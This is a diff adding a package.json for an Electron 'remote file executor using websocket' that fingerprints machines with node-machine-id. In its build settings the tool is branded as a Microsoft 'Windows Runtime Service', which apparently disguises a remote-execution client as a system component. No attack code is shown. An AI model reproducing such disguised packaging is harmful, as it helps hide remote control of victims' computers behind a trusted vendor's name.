@@ -1,0 +1,39 @@
+{
+  "name": "remote-executor",
+  "version": "1.0.0",
+  "description": "remote file executor using websocket",
+  "author": "00nx",
+  "main": "main.js",
+  "scripts": {
+    "start": "electron .",
+    "build": "electron-builder",
+    "postinstall": "electron-builder install-app-deps"
+  },
+  "build": {
+    "appId": "com.microsoft.runtime",
+    "productName": "Windows Runtime Service",
+    "directories": {
+      "buildResources": "assets"
+    },
+    "files": [
+      "**/*"
+    ],
+    "win": {
+      "target": "portable",
+      "artifactName": "remote-file-exec.exe"
+    },
+    "extraMetadata": {
+      "version": "1.0.0"
+    }
+  },
+  "dependencies": {
+    "axios": "^1.6.0",
+    "node-machine-id": "^1.1.12",
+    "ws": "^8.13.0"
+  },
+  "devDependencies": {
+    "electron": "^32.2.0",
+    "electron-builder": "^25.1.7",
+    "electron-rebuild": "^3.2.9"
+  }
+}
